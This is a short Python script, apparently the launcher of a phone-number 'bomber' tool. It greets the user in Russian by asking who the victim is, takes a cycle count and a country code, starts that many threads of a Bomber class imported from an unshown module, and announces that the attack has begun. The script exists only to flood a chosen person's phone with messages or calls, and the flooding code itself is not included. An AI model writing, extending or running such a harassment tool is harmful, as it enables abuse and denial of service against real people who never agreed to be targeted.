#!/usr/bin/ python
#!coding:utf-8
import os
from ServiseDS import Bomber
os.system ("clear")

print("Приветствую!! ну и кто жертва?")
count = int(input("Количество циклов: "))
iteration = int(input("Код страны: "))
for _ in range(count):
    thread = Bomber(iteration)
    thread.start()
print("[Атака началась!]")